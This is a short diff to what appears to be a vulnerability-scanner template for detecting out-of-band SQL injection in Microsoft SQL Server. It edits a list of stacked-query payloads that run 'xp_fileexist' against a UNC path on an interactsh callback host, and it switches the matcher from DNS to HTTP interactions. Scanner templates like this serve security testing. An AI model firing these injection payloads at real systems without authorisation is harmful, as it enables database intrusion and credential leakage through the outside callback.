@@ -13,9 +13,9 @@ http:
 
     payloads:
       fileexist:
-        - "1; exec master..xp_fileexist '\\\\{{interactsh-url}}\\\\file'--"
         - "1'; exec master..xp_fileexist '\\\\{{interactsh-url}}\\\\file'--"
-        - "1"; exec master..xp_fileexist '\\\\{{interactsh-url}}\\\\file'--"
+        - "1; exec master..xp_fileexist '\\\\{{interactsh-url}}\\\\file'--"
+        - "1\"; exec master..xp_fileexist '\\\\{{interactsh-url}}\\\\file'--"
         
     fuzzing:
       - part: query
@@ -28,4 +28,4 @@ http:
       - type: word
         part: interactsh_protocol
         words:
-          - dns
+          - http
